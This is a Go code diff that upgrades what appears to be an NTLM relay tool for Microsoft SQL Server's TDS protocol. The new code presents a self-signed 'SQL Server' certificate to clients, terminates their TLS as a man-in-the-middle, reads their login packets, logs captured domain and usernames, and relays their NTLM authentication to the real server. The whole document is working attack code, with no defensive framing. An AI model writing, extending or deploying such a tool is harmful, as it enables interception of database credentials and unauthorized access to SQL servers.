@@ -1,13 +1,19 @@
 package main
 
 import (
+	"crypto/ecdsa"
+	"crypto/elliptic"
+	"crypto/rand"
 	"crypto/tls"
+	"crypto/x509"
+	"crypto/x509/pkix"
 	"encoding/binary"
 	"encoding/hex"
 	"flag"
 	"fmt"
 	"io"
 	"log"
+	"math/big"
 	"net"
 	"strings"
 	"sync/atomic"
@@ -22,13 +28,43 @@ var (
 	remoteAddr  = flag.String("remote", "", "Remote SQL Server address (host:port)")
 	verbose     = flag.Bool("v", false, "Verbose logging")
 	connCounter uint64
+	relayCert   tls.Certificate
 )
+
+func generateSelfSignedCert() (tls.Certificate, error) {
+	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
+	if err != nil {
+		return tls.Certificate{}, err
+	}
+	template := &x509.Certificate{
+		SerialNumber: big.NewInt(1),
+		Subject:      pkix.Name{CommonName: "SQL Server"},
+		NotBefore:    time.Now(),
+		NotAfter:     time.Now().Add(365 * 24 * time.Hour),
+		KeyUsage:     x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
+		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
+	}
+	certDER, err := x509.CreateCertificate(rand.Reader, template, template, &key.PublicKey, key)
+	if err != nil {
+		return tls.Certificate{}, err
+	}
+	return tls.Certificate{
+		Certificate: [][]byte{certDER},
+		PrivateKey:  key,
+	}, nil
+}
 
 func main() {
 	flag.Parse()
 
 	if *remoteAddr == "" {
 		log.Fatal("Must specify -remote flag with SQL Server address")
+	}
+
+	var err error
+	relayCert, err = generateSelfSignedCert()
+	if err != nil {
+		log.Fatalf("Failed to generate TLS certificate: %v", err)
 	}
 
 	// Listen on both IPv4 and IPv6 explicitly
@@ -115,36 +151,55 @@ func handleConnection(clientConn net.Conn) {
 	// Check server's encryption preference and establish TLS if needed
 	serverEncrypt := getEncryptionByte(serverPreLogin)
 	var serverConn net.Conn = rawRemote
+	var clientDataConn net.Conn = clientConn // the connection we read/write data from after handshake
 
 	if serverEncrypt != 0x02 { // Anything other than ENCRYPT_NOT_SUP
 		if *verbose {
-			log.Printf("[%s] Server encryption=0x%02x, performing TLS handshake", tag, serverEncrypt)
+			log.Printf("[%s] Server encryption=0x%02x, performing TLS handshake with server", tag, serverEncrypt)
 		}
 
-		hsConn := &tdsHandshakeConn{conn: rawRemote}
-		tlsConn := tls.Client(hsConn, &tls.Config{
+		// TLS handshake with server (client role, TDS-wrapped)
+		serverHSConn := &tdsHandshakeConn{conn: rawRemote, writeType: 0x12}
+		serverTLS := tls.Client(serverHSConn, &tls.Config{
 			InsecureSkipVerify: true,
 		})
-		if err := tlsConn.Handshake(); err != nil {
+		if err := serverTLS.Handshake(); err != nil {
 			log.Printf("[%s] TLS handshake with server failed: %v", tag, err)
 			return
 		}
-		hsConn.passthrough = true
-		serverConn = tlsConn
+		serverHSConn.passthrough = true
+		serverConn = serverTLS
 		log.Printf("[%s] TLS established with server", tag)
+
+		// Forward server's PRELOGIN to client UNCHANGED (encryption stays enabled)
+		if _, err := clientConn.Write(serverPreLogin); err != nil {
+			log.Printf("[%s] Failed to send pre-login to client: %v", tag, err)
+			return
+		}
+
+		// TLS handshake with client (server role, TDS-wrapped)
+		// Client sends TLS in type 0x12, we respond with type 0x04
+		clientHSConn := &tdsHandshakeConn{conn: clientConn, writeType: 0x04}
+		clientTLS := tls.Server(clientHSConn, &tls.Config{
+			Certificates: []tls.Certificate{relayCert},
+		})
+		if err := clientTLS.Handshake(); err != nil {
+			log.Printf("[%s] TLS handshake with client failed: %v", tag, err)
+			return
+		}
+		clientHSConn.passthrough = true
+		clientDataConn = clientTLS
+		log.Printf("[%s] TLS established with client (MITM)", tag)
+	} else {
+		// No encryption — forward PRELOGIN as-is, stay plaintext
+		if _, err := clientConn.Write(serverPreLogin); err != nil {
+			log.Printf("[%s] Failed to send pre-login to client: %v", tag, err)
+			return
+		}
 	}
 
-	// Tell client encryption is not supported so it stays plaintext
-	// (MARS negotiation left intact)
-	disableEncryption(serverPreLogin)
-	// disableMARS(serverPreLogin)
-	if _, err := clientConn.Write(serverPreLogin); err != nil {
-		log.Printf("[%s] Failed to send pre-login to client: %v", tag, err)
-		return
-	}
-
-	// Phase 2: Read client's login packet to extract credentials (plaintext)
-	loginPacket, err := readTDSPacket(clientConn, tag+"/client-login")
+	// Phase 2: Read client's login packet (over TLS if encryption active)
+	loginPacket, err := readTDSPacket(clientDataConn, tag+"/client-login")
 	if err != nil {
 		log.Printf("[%s] Failed to read client login: %v", tag, err)
 		return
@@ -158,7 +213,7 @@ func handleConnection(clientConn net.Conn) {
 
 	log.Printf("[%s] Received credentials: %s\\%s (database=%q)", tag, credentials.Domain, credentials.Username, decodeUTF16LE(loginFields.Database))
 
-	// Phase 3: Perform NTLM authentication with remote server (over TLS if applicable)
+	// Phase 3: Perform NTLM authentication with remote server
 	authResponse, err := performNTLMAuth(serverConn, credentials, loginPacket, tag)
 	if err != nil {
 		log.Printf("[%s] NTLM authentication failed: %v", tag, err)
@@ -168,23 +223,22 @@ func handleConnection(clientConn net.Conn) {
 	log.Printf("[%s] NTLM authentication successful for %s\\%s", tag, credentials.Domain, credentials.Username)
 
 	// Phase 4: Forward the server's real login response to the client
-	// (contains correct TDS version, env changes, collation, etc.)
-	if _, err := clientConn.Write(authResponse); err != nil {
+	if _, err := clientDataConn.Write(authResponse); err != nil {
 		log.Printf("[%s] Failed to forward login response to client: %v", tag, err)
 		return
 	}
 
-	// Phase 5: Relay all subsequent traffic (plaintext client <-> TLS server)
+	// Phase 5: Relay all subsequent traffic (client TLS <-> server TLS)
 	log.Printf("[%s] Starting bidirectional relay", tag)
 	var closing atomic.Bool
 	done := make(chan struct{})
 	go func() {
-		relay(clientConn, serverConn, tag+"/server->client", &closing)
+		relay(clientDataConn, serverConn, tag+"/server->client", &closing)
 		closing.Store(true)
 		clientConn.Close()
 		close(done)
 	}()
-	relay(serverConn, clientConn, tag+"/client->server", &closing)
+	relay(serverConn, clientDataConn, tag+"/client->server", &closing)
 	closing.Store(true)
 	serverConn.Close()
 	<-done
@@ -362,6 +416,7 @@ type tdsHandshakeConn struct {
 	conn        net.Conn
 	readBuf     []byte
 	passthrough bool
+	writeType   byte // TDS packet type for writes: 0x12 for client→server, 0x04 for server→client
 }
 
 func (c *tdsHandshakeConn) Read(b []byte) (int, error) {
@@ -404,9 +459,13 @@ func (c *tdsHandshakeConn) Write(b []byte) (int, error) {
 		return c.conn.Write(b)
 	}
 
-	// Wrap in TDS PRELOGIN packet
+	// Wrap in TDS packet (type depends on direction)
+	pktType := c.writeType
+	if pktType == 0 {
+		pktType = 0x12 // default: PRELOGIN (client→server)
+	}
 	packet := make([]byte, 8+len(b))
-	packet[0] = 0x12 // PRELOGIN
+	packet[0] = pktType
 	packet[1] = 0x01 // EOM
 	binary.BigEndian.PutUint16(packet[2:4], uint16(8+len(b)))
 	copy(packet[8:], b)
